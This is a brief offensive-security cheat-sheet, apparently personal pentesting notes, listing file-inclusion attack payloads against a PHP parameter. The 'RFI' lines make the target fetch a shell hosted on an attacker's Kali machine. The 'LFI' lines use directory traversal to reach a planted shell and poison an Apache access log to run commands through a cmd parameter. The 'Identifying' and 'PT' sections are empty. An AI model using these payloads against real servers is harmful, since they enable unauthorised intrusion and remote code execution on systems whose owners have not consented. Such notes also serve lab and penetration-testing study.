#### Identifying
```

```

#### Exploiting
##### RFI
```
#Check whether you can request a file from a remote server.
1. http://example.com/file.php?file=http://<kali-ip>/myshell.exe
2. http://example.com/file.php?file=//<kali-ip>/kali/myshell.exe
```
##### LFI
```
#Check whether we can execute local files. Is there a way to upload prior perhaps?
1. http://example.com/file.php?file=/../../../var/www/html/myshell.exe

#Check whether we can poison log files.
	#Apache
	1. http://example.com/file.php?file=../..//xampp/apache/logs/access.log&cmd=dir
```
##### PT
```

```
